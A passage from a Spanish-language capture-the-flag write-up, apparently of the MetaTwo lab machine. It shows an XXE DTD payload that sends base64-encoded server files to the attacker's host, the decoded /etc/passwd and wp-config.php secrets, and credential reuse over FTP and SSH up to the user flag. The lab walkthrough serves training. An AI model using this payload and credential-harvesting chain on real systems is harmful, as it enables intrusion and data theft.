</pre></td><td class="rouge-code"><pre>❯ <span class="nb">echo</span> <span class="s1">'cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo='</span> | <span class="nb">base64</span> <span class="nt">-d</span><span class="p">;</span><span class="nb">echo
</span>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
jnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:107:65534::/srv/ftp:/usr/sbin/nologin
</pre></td></tr></tbody></table></code></div></div>
<p>COmo vimos que usaba <code class="language-plaintext highlighter-rouge">NGINX</code> podemos atentar contra la ruta <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/default</code> y ver mas informacion acerca del sitio.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">cat </span>exploit.dtd
&lt;<span class="o">!</span>ENTITY % file SYSTEM <span class="s2">"php://filter/convert.base64-encode/resource=/etc/nginx/sites-enabled/default"</span><span class="o">&gt;</span>
&lt;<span class="o">!</span>ENTITY % init <span class="s2">"&lt;!ENTITY &amp;#x25; trick SYSTEM 'http://10.10.14.36/?p=%file;'&gt;"</span> <span class="o">&gt;</span>
</pre></td></tr></tbody></table></code></div></div>
<p><img data-src="/assets/img/commons/metatwo-writeup/9.png" alt="Events " class="center-image" data-proofer-ignore>
<em>WAV</em></p>

<h2 id="foothold"><span class="mr-2">FootHold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>
<p>Wuolah vemos cosas interesantes.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>server <span class="o">{</span>

	listen 80<span class="p">;</span>
	listen <span class="o">[</span>::]:80<span class="p">;</span>

	root /var/www/metapress.htb/blog<span class="p">;</span>

	index index.php index.html<span class="p">;</span>

        <span class="k">if</span> <span class="o">(</span><span class="nv">$http_host</span> <span class="o">!=</span> <span class="s2">"metapress.htb"</span><span class="o">)</span> <span class="o">{</span>
                rewrite ^ http://metapress.htb/<span class="p">;</span>
        <span class="o">}</span>

	location / <span class="o">{</span>
		try_files <span class="nv">$uri</span> <span class="nv">$uri</span>/ /index.php?<span class="nv">$args</span><span class="p">;</span>
	<span class="o">}</span>
    
	location ~ <span class="se">\.</span>php<span class="nv">$ </span><span class="o">{</span>
		include snippets/fastcgi-php.conf<span class="p">;</span>
		fastcgi_pass unix:/var/run/php/php8.0-fpm.sock<span class="p">;</span>
	<span class="o">}</span>

	location ~<span class="k">*</span> <span class="se">\.</span><span class="o">(</span>js|css|png|jpg|jpeg|gif|ico|svg<span class="o">)</span><span class="nv">$ </span><span class="o">{</span>
		expires max<span class="p">;</span>
		log_not_found off<span class="p">;</span>
	<span class="o">}</span>

<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>
<h3 id="nos-conectamos-por-ssh-al-usuario"><span class="mr-2">Nos conectamos por SSH al usuario</span><a href="#nos-conectamos-por-ssh-al-usuario" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>
<p>Si vemos la ruta del proyecto ahí se encuentra un archivo importante <code class="language-plaintext highlighter-rouge">wp-config.php</code> como no podemos apuntar a el ya que el propietario es <code class="language-plaintext highlighter-rouge">root</code> podemos aplicar un recorrido de directorios <code class="language-plaintext highlighter-rouge">../wp-config.php</code>.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>❯ php <span class="nt">-S</span> 0.0.0.0:80
<span class="o">[</span>Wed Mar 29 14:46:22 2023] PHP 7.4.33 Development Server <span class="o">(</span>http://0.0.0.0:80<span class="o">)</span> started
<span class="o">[</span>Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 Accepted
<span class="o">[</span>Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 <span class="o">[</span>200]: <span class="o">(</span>null<span class="o">)</span> /exploit.dtd
<span class="o">[</span>Wed Mar 29 14:46:32 2023] 10.10.11.186:49504 Closing
<span class="o">[</span>Wed Mar 29 14:46:32 2023] 10.10.11.186:49512 Accepted
<span class="o">[</span>Wed Mar 29 14:46:32 2023] 10.10.11.186:49512 <span class="o">[</span>404]: <span class="o">(</span>null<span class="o">)</span> /?p<span class="o">=</span>PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg<span class="o">==</span> - No such file or directory
</pre></td></tr></tbody></table></code></div></div>
<p>Si le aplicamos un decode a esto vemos</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre>&lt;?php
/<span class="k">**</span> The name of the database <span class="k">for </span>WordPress <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_NAME'</span>, <span class="s1">'blog'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database username <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_USER'</span>, <span class="s1">'blog'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL database password <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_PASSWORD'</span>, <span class="s1">'635Aq@TdqrCwXFUZ'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> MySQL <span class="nb">hostname</span> <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_HOST'</span>, <span class="s1">'localhost'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> Database Charset to use <span class="k">in </span>creating database tables. <span class="k">*</span>/
define<span class="o">(</span> <span class="s1">'DB_CHARSET'</span>, <span class="s1">'utf8mb4'</span> <span class="o">)</span><span class="p">;</span>

/<span class="k">**</span> The Database Collate type. Don<span class="s1">'t change this if in doubt. */
define( '</span>DB_COLLATE<span class="s1">', '' );

define( '</span>FS_METHOD<span class="s1">', '</span>ftpext<span class="s1">' );
define( '</span>FTP_USER<span class="s1">', '</span>metapress.htb<span class="s1">' );
define( '</span>FTP_PASS<span class="s1">', '</span>9NYS_ii@FyL_p5M2NvJ<span class="s1">' );
define( '</span>FTP_HOST<span class="s1">', '</span>ftp.metapress.htb<span class="s1">' );
define( '</span>FTP_BASE<span class="s1">', '</span>blog/<span class="s1">' );
define( '</span>FTP_SSL<span class="s1">', false );

/**#@+
 * Authentication Unique Keys and Salts.
 * @since 2.6.0
 */
define( '</span>AUTH_KEY<span class="s1">',         '</span>?!Z<span class="nv">$uGO</span><span class="k">*</span>A6xOE5x,pweP4i<span class="k">*</span>z<span class="p">;</span>m<span class="sb">`</span>|.Z:X@<span class="o">)</span>QRQFXkCRyl7<span class="o">}</span><span class="sb">`</span><span class="nv">rXVG</span><span class="o">=</span>3 n&gt;+3m?.B/:<span class="s1">' );
define( '</span>SECURE_AUTH_KEY<span class="s1">',  '</span>x<span class="nv">$i$)</span>b0]b1cup<span class="p">;</span>47<span class="sb">`</span>YVua/JHq%<span class="k">*</span>8UA6g]0bwoEW:91EZ9h]rWlVq%IQ66pf<span class="o">{=]</span>a%<span class="s1">' );
define( '</span>LOGGED_IN_KEY<span class="s1">',    '</span>J+mxCaP4z&lt;g.6P^t<span class="sb">`</span>ziv&gt;dd<span class="o">}</span>EEi%48%JnRq^2MjFiitn#&amp;n+HXv]||E+F~C<span class="o">{</span>qKXy<span class="s1">' );
define( '</span>NONCE_KEY<span class="s1">',        '</span>SmeDr<span class="nv">$$</span>O0ji<span class="p">;</span>^9]<span class="k">*</span><span class="sb">`</span>~GNe!pX@DvWb4m9Ed<span class="o">=</span>Dd<span class="o">(</span>.r-q<span class="o">{</span>^z<span class="o">(</span>F?<span class="o">)</span>7mxNUg986tQO7O5<span class="s1">' );
define( '</span>AUTH_SALT<span class="s1">',        '</span><span class="o">[</span><span class="p">;</span>TBgc/,M#<span class="o">)</span>d5f[H<span class="k">*</span>tg50ifT?Zv.5Wx<span class="o">=</span><span class="sb">`</span>l@v<span class="nv">$-</span>vH<span class="k">*</span>&lt;~:0]s<span class="o">}</span>d&lt;&amp;M<span class="p">;</span>.,x0z~R&gt;3!D<span class="s1">' );
define( '</span>SECURE_AUTH_SALT<span class="s1">', '</span><span class="o">&gt;</span><span class="sb">`</span>VAs6!G955dJs?<span class="nv">$O4zm</span><span class="sb">`</span>.Q<span class="p">;</span>amjW^uJrk_1-dI<span class="o">(</span>SjROdW[S&amp;~omiH^jVC?2-I?I.<span class="s1">' );
define( '</span>LOGGED_IN_SALT<span class="s1">',   '</span>4[fS^3!<span class="o">=</span>%?HIopMpkgYboy8-jl^i]Mw<span class="o">}</span>Y d~N<span class="o">=</span>&amp;^JsI<span class="sb">`</span>M<span class="o">)</span>FJTJEVI<span class="o">)</span> N#NOidIf<span class="o">=</span><span class="s1">' );
define( '</span>NONCE_SALT<span class="s1">',       '</span>.sU&amp;CQ@IRlh O<span class="p">;</span>5aslY+Fq8QWheSNxd6Ve#<span class="o">}</span>w!Bq,h<span class="o">}</span>V9jKSkTGsv%Y451F8L<span class="o">=</span>bL<span class="s1">' );

/**
 * WordPress Database Table prefix.
 */
$table_prefix = '</span>wp_<span class="s1">';

/**
 * For developers: WordPress debugging mode.
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( '</span>WP_DEBUG<span class="s1">', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( '</span>ABSPATH<span class="s1">' ) ) {
	define( '</span>ABSPATH<span class="s1">', __DIR__ . '</span>/<span class="s1">' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . '</span>wp-settings.php<span class="s1">';
</span></pre></td></tr></tbody></table></code></div></div>

<p>Si se acuerdan en el escaneo NMAP  vimmos el puerto <strong><code class="language-plaintext highlighter-rouge">21 (FTP)</code></strong>, podemos autenticarnos.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>❯ ftp 10.10.11.186
Connected to 10.10.11.186.
220 ProFTPD Server <span class="o">(</span>Debian<span class="o">)</span> <span class="o">[</span>::ffff:10.10.11.186]
Name <span class="o">(</span>10.10.11.186:h4ckerlite<span class="o">)</span>: metapress.htb
331 Password required <span class="k">for </span>metapress.htb
Password: 9NYS_ii@FyL_p5M2NvJ
230 User metapress.htb logged <span class="k">in
</span>Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>200 PORT <span class="nb">command </span>successful
150 Opening ASCII mode data connection <span class="k">for </span>file list
drwxr-xr-x   5 metapress.htb metapress.htb     4096 Oct  5 14:12 blog
drwxr-xr-x   3 metapress.htb metapress.htb     4096 Oct  5 14:12 mailer
226 Transfer <span class="nb">complete
</span>ftp&gt; <span class="nb">cd </span>mailer
250 CWD <span class="nb">command </span>successful
ftp&gt; <span class="nb">ls
</span>200 PORT <span class="nb">command </span>successful
150 Opening ASCII mode data connection <span class="k">for </span>file list
drwxr-xr-x   4 metapress.htb metapress.htb     4096 Oct  5 14:12 PHPMailer
<span class="nt">-rw-r--r--</span>   1 metapress.htb metapress.htb     1126 Jun 22  2022 send_email.php
226 Transfer <span class="nb">complete
</span>ftp&gt; get send_email.php
<span class="nb">local</span>: send_email.php remote: send_email.php
200 PORT <span class="nb">command </span>successful
150 Opening BINARY mode data connection <span class="k">for </span>send_email.php <span class="o">(</span>1126 bytes<span class="o">)</span>
226 Transfer <span class="nb">complete
</span>1126 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>911.0269 kB/s<span class="o">)</span>
ftp&gt; 
</pre></td></tr></tbody></table></code></div></div>

<p>Leemos el archivo.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
</pre></td><td class="rouge-code"><pre>❯ <span class="nb">cat </span>send_email.php
&lt;?php
/<span class="k">*</span>
 <span class="k">*</span> This script will be used to send an email to all our <span class="nb">users </span>when ready <span class="k">for </span>launch
<span class="k">*</span>/

use PHPMailer<span class="se">\P</span>HPMailer<span class="se">\P</span>HPMailer<span class="p">;</span>
use PHPMailer<span class="se">\P</span>HPMailer<span class="se">\S</span>MTP<span class="p">;</span>
use PHPMailer<span class="se">\P</span>HPMailer<span class="se">\E</span>xception<span class="p">;</span>

require <span class="s1">'PHPMailer/src/Exception.php'</span><span class="p">;</span>
require <span class="s1">'PHPMailer/src/PHPMailer.php'</span><span class="p">;</span>
require <span class="s1">'PHPMailer/src/SMTP.php'</span><span class="p">;</span>

<span class="nv">$mail</span> <span class="o">=</span> new PHPMailer<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$mail</span>-&gt;SMTPDebug <span class="o">=</span> 3<span class="p">;</span>                               
<span class="nv">$mail</span>-&gt;isSMTP<span class="o">()</span><span class="p">;</span>            

<span class="nv">$mail</span>-&gt;Host <span class="o">=</span> <span class="s2">"mail.metapress.htb"</span><span class="p">;</span>
<span class="nv">$mail</span>-&gt;SMTPAuth <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>                          
<span class="nv">$mail</span>-&gt;Username <span class="o">=</span> <span class="s2">"jnelson@metapress.htb"</span><span class="p">;</span>                 
<span class="nv">$mail</span>-&gt;Password <span class="o">=</span> <span class="s2">"Cb4_JmWM8zUZWMu@Ys"</span><span class="p">;</span>                           
<span class="nv">$mail</span>-&gt;SMTPSecure <span class="o">=</span> <span class="s2">"tls"</span><span class="p">;</span>                           
<span class="nv">$mail</span>-&gt;Port <span class="o">=</span> 587<span class="p">;</span>                                   

<span class="nv">$mail</span>-&gt;From <span class="o">=</span> <span class="s2">"jnelson@metapress.htb"</span><span class="p">;</span>
<span class="nv">$mail</span>-&gt;FromName <span class="o">=</span> <span class="s2">"James Nelson"</span><span class="p">;</span>

<span class="nv">$mail</span>-&gt;addAddress<span class="o">(</span><span class="s2">"info@metapress.htb"</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$mail</span>-&gt;isHTML<span class="o">(</span><span class="nb">true</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$mail</span>-&gt;Subject <span class="o">=</span> <span class="s2">"Startup"</span><span class="p">;</span>
<span class="nv">$mail</span>-&gt;Body <span class="o">=</span> <span class="s2">"&lt;i&gt;We just started our new blog metapress.htb!&lt;/i&gt;"</span><span class="p">;</span>

try <span class="o">{</span>
    <span class="nv">$mail</span>-&gt;send<span class="o">()</span><span class="p">;</span>
    <span class="nb">echo</span> <span class="s2">"Message has been sent successfully"</span><span class="p">;</span>
<span class="o">}</span> catch <span class="o">(</span>Exception <span class="nv">$e</span><span class="o">)</span> <span class="o">{</span>
    <span class="nb">echo</span> <span class="s2">"Mailer Error: "</span> <span class="nb">.</span> <span class="nv">$mail</span>-&gt;ErrorInfo<span class="p">;</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Vemos un usuario y su contraseña, procedemos a conectarnos por SSH.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>❯ ssh jnelson@metapress.htb
The authenticity of host <span class="s1">'metapress.htb (10.10.11.186)'</span> can<span class="s1">'t be established.
ECDSA key fingerprint is SHA256:3MyoxrDpzSN/H4ZJAbl3k/OSAyorwqmMnL3UtS0pVcQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>metapress.htb,10.10.11.186<span class="s1">' (ECDSA) to the list of known hosts.
jnelson@metapress.htb'</span>s password: Cb4_JmWM8zUZWMu@Ys
Linux meta2 5.10.0-19-amd64 <span class="c">#1 SMP Debian 5.10.149-2 (2022-10-21) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Mar 29 18:40:26 2023 from 10.10.16.29
jnelson@meta2:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</pre></td></tr></tbody></table></code></div></div>
<p>Procedemos a leer la flag.</p>
<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="¡Copiado!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>jnelson@meta2:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
1f<span class="k">****************************</span>2d
jnelson@meta2:~<span class="nv">$ </span>
</pre></td></tr></tbody></table></code></div></div>
<h2 id="escalada-de-privilegios"><span class="mr-2">Escalada de Privilegios</span><a href="#escalada-de-privilegios" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

